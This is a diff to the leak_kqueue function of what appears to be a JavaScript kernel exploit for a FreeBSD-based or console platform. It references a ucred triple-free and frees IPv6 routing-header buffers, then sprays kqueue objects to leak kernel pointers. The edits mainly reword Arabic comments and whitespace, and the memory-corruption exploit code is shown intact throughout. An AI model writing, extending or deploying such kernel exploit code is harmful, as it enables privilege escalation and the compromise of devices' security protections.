@@ -1419,18 +1419,15 @@ function trigger_ucred_triplefree() {
 }
 function leak_kqueue() {
   debug('Leaking kqueue...');
+  // 1) صفّر الذاكرة مرة واحدة فقط
+  write64(leak_rthdr.add(0x08), 0);
+  write64(leak_rthdr.add(0x98), 0);
 
-  // 1) صفّر الحقول اللي هتستخدمها
-  write64(leak_rthdr.add(0x08), 0);  // magic
-  write64(leak_rthdr.add(0x98), 0);  // fdp
-
-  // 2) free مرة واحدة قبل اللوب
+  // 2) اعمل free مرة واحدة فقط قبل اللوب
   free_rthdr(ipv6_socks[triplets[1]]);
-
-  var MAX_KQ    = 4000;
+  var MAX_KQ = 4000;
   var magic_val = new BigInt(0x0, 0x1430000);
   var magic_add = leak_rthdr.add(0x08);
-
   for (var i = 0; i < MAX_KQ; i++) {
     // 3) افتح kqueue
     var kq = kqueue();
@@ -1455,17 +1452,15 @@ function leak_kqueue() {
       continue;
     }
 
-    // 7) نجاح
+    // 7) لو وصلنا هنا → نجاح
     kq_fdp = fdp;
     kl_lock = read64(leak_rthdr.add(0x60));
     close(kq);
     log('Leaking done .....');
     return true;
   }
-
   return false;
 }
-
 function leak_kqueue_safe() {
   try {
     return leak_kqueue();
